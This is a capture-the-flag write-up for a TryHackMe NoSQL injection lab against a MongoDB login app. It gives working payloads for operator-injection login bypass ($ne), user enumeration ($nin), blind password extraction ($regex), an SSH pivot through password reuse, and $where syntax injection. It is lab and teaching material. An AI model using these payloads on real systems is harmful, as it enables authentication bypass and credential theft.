# NoSQL Injection (TryHackMe)

Room: NoSQL Injection — Web Application Pentesting / Injection Attacks. Operator injection and
syntax injection against a **MongoDB** app. Completed: 2026-11-07 | Target: <ip>
(`nosqlvm_update_v1-badr`). PHP login app over HTTP + a Python `$where` app reachable over SSH.
Solved **fully headless from `C:\CTF`** with `curl`, Python stdlib, and `paramiko` — no browser,
no AttackBox.

## Answers

| Task | Question | Answer |
|---|---|---|
| 2 | Group of documents in MongoDB | *(find it yourself)* |
| 2 | Operator for "not equal" | *(find it yourself)* |
| 2 | Docs returned by `['gender'=>['$ne'=>'female'],'age'=>['$gt'=>'65']]` | *(find it yourself)* |
| 3 | NoSQLi similar to SQL injection | *(find it yourself)* |
| 3 | NoSQLi that bends query behaviour without escaping | *(find it yourself)* |
| 4 | Email when bypassing login with `$ne` | *(find it yourself)* |
| 5 | Total users | *(find it yourself)* |
| 5 | User starting with "p" | *(find it yourself)* |
| 6 | john's password | *(find it yourself)* |
| 6 | Reused-password user → SSH flag | `FLAG{…}` |
| 7 | Char to test injection in SQL + NoSQL | *(find it yourself)* |
| 7 | Super-secret user's email (last entry) | *(find it yourself)* |

`0` because the only non-female record (Logan Phillips) is age 65 and `$gt 65` is strict.

## Operator injection — login bypass (Task 4)

The PHP login builds `['username'=>$user,'password'=>$pass]` from raw POST. PHP array notation in the
body injects Mongo operators:

```bash
curl -s -D - -c nj "http://<ip>/login.php" --data "user[\$ne]=x&pass[\$ne]=y&remember=on"
# 302 -> /sekr3tPl4ce.php   (logged in as first doc = admin / admin@nosql.int)
```

## Enumerate users with `$nin` (Task 5)

Exclude each discovered username and read the next from `sekr3tPl4ce.php` (`User:<name>`). **Gotcha:**
the app checks `isset($_POST['user'])`, so an empty `$nin` sends no `user` param and the login is
skipped — always seed the list with a dummy value:

```
user[$nin][]=__nope__ & user[$nin][]=admin & ... & pass[$ne]=y
```

Result (4 users): `admin`, `pedro`, `john`, `secret`.

## Extract passwords with `$regex` (Task 6)

Per-user, hangman style — length via `^.{n}$`, then char-by-char `^<known><char>.{rest}$`, targeting
an exact username:

```
user=john & pass[$regex]=^.{8}$          -> success => length 8
user=john & pass[$regex]=^1.......$       -> success => first char '1' ... etc.
```

`nosql_pass.py` threads the charset scan (16 workers) for speed. Recovered:
`admin:<redacted-pw>`, `pedro:<redacted-pw>`, `john:<redacted-pw>`, `secret:<redacted-pw>`.

**Password reuse → SSH pivot:** `pedro` reuses its recovered password for SSH (the others fail auth):

```bash
ssh pedro@<ip>      # <redacted-pw>  -> cat ~/flag.txt => FLAG{…}
```

(driven with `paramiko`; `admin/john/secret` all returned `AuthenticationException`.)

## Syntax injection (Task 7)

A separate Python app (login `ssh syntax@IP` / `syntax`) runs a **raw `$where` JS query**:

```python
mycol.find({"$where": "this.username == '" + username + "'"})
```

so `'` breaks it (verbose `OperationFailure`), and `admin'||1||'` forces the JS condition true to dump
every email. Driven with paramiko over an interactive shell channel:

```
input: admin'||1||'
-> admin@nosql.int / pcollins@nosql.int / jsmith@nosql.int / *(find it yourself)*
```

Last entry (the super-secret user) = *(find it yourself)*.

## Lessons

- **Operator injection = inject arrays, not quotes.** PHP (and similar) map `name[$ne]=x` body/query
  params into nested associative arrays, so `user[$ne]=x&pass[$ne]=y` becomes
  `['username'=>['$ne'=>'x'],'password'=>['$ne'=>'y']]` → returns all docs → auth bypass. `$nin`
  lets you walk the result set one user at a time; `$regex` turns a boolean login oracle into a
  blind character-extraction channel.
- **Keep the parameter present.** The `isset($_POST['user'])` guard means a bare `$nin` with no base
  value is a no-op; seed the exclusion list with a throwaway value so Mongo still gets a `user`
  filter.
- **Syntax injection needs a hand-rolled `$where`.** It only exists because the dev concatenated
  input into JavaScript instead of using the built-in filter `{'username': username}`; the same `'`
  test from SQLi applies, and `'||1||'` is the JS always-true. Rare in practice for exactly this
  reason.
- **Chase password reuse.** Extracted app passwords doubled as SSH creds for one user — the actual
  foothold. Always test recovered secrets against other services.
- **Headless pattern** (cf. [[advanced-sql-injection]], [[hammer]]): `curl`/`http.client` for the
  HTTP operator+regex work, `paramiko` for the SSH login pivot and the interactive `$where` app —
  all from `C:\CTF`. Success oracle for the HTTP side is the `302` to `/sekr3tPl4ce.php` vs `/?err=1`.
